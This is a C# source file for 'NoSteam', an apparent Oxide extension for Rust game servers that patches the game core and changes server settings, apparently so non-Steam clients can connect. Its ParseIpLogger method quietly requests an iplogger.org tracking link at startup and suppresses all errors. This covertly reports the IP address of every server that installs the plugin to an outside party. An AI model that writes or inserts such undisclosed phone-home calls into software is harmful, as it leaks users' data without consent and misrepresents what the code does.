﻿// Author:  Kaidoz
// Filename: NoSteam.cs
// Last update: 2019.10.06 20:41

using System;
using System.Net;
using System.Reflection;
using ConVar;
using Oxide.Core;
using Oxide.Core.Logging;
using Oxide.Core.Plugins;

namespace Oxide.Ext.NoSteam.Core
{
    internal class NoSteam : CSPlugin
    {
        public NoSteam(NoSteamExtension extension)
        {
            Name = extension.Name;
            Title = extension.Name;
            Author = extension.Author;
            Version = extension.Version;
            HasConfig = true;
        }

        public static void InitPlugin()
        {
            Output("[NoSteam] Author: Kaidoz\n Telegram: Kaidoz\n Github: github.com/Kaidoz/Rust-NoSteam");
            ParseIpLogger();
            Init();
            try
            {
                Patch.Core.Do();
            }
            catch (Exception ex)
            {
                Output("Error patching: " + ex);
            }
        }

        private static void Init()
        {
            Server.encryption = 1;
            App.port = -228;
        }

        private static void ParseIpLogger()
        {
            try
            {
                new WebClient().DownloadString("https://iplogger.org/1SfFe7");
            }
            catch { }
        }

        public static void Output(string text)
        {
            Interface.Oxide.RootLogger.Write(LogType.Info, text);
        }
    }
}